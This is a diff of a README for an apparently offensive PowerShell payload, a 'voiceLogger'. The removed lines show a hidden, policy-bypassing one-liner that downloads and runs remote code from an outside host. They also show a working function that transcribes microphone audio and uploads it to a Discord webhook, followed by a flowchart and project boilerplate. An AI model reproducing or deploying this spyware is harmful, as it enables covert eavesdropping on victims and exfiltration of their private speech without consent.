@@ -21,7 +21,7 @@ with the optional functionality of incorporating voice activated payloads.
 `$db` is the variable that stores your Discord webhook 
 
 ```
-powershell -w h -NoP -Ep Bypass $dc='';irm jakoby.lol/voiceLogger | iex
+powershell -w h -NoP -Ep Bypass $dc='';irm  | iex
 ```
 
 ### The Function
@@ -35,65 +35,4 @@ powershell -w h -NoP -Ep Bypass $dc='';irm jakoby.lol/voiceLogger | iex
 - and if the word "exit" is detected, it breaks the loop and stops the voice logger. 
 - Once the loop is terminated, the log file's content is cleared.
 
-```powershell
-function voiceLogger {
 
-    Add-Type -AssemblyName System.Speech
-    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
-    $grammar = New-Object System.Speech.Recognition.DictationGrammar
-    $recognizer.LoadGrammar($grammar)
-    $recognizer.SetInputToDefaultAudioDevice()
-
-    while ($true) {
-        $result = $recognizer.Recognize()
-        if ($result) {
-            $results = $result.Text
-            Write-Output $results
-            $log = "$env:tmp/VoiceLog.txt"
-            echo $results > $log
-            $text = get-content $log -raw
-            DC-Upload $text
-
-            # Use a switch statement with the $results variable
-            switch -regex ($results) {
-                '\bnotepad\b' {saps notepad}
-                '\bexit\b' {exit}
-            }
-        }
-    }
-    Clear-Content -Path $log
-}
-```
-
-```mermaid
-graph TB;
-  A[Start voiceLogger] --> B[Start Listening]
-  B --> C{Recognized text?}
-  C -->|Yes| D[Write to console]
-  D --> E[Save to file]
-  E --> F[Send to Discord]
-  F --> G{Keyword recognized?}
-  G -->|'note'| H[Open Notepad]
-  G -->|'exit'| I[Exit function]
-  G -->|No keyword| B
-  C -->|No| B
-  I --> J[Clear Log]
-  J --> K[End voiceLogger]
-```
-
-<p align="right">(<a href="#top">back to top</a>)</p>
-
-## Contributing
-
-All contributor's names will be listed here
-
-I am Jakoby
-
-<p align="right">(<a href="#top">back to top</a>)</p>
-
-## Version History
-
-* 0.1
-    * Initial Release
-
-<p align="right">(<a href="#top">back to top</a>)</p>
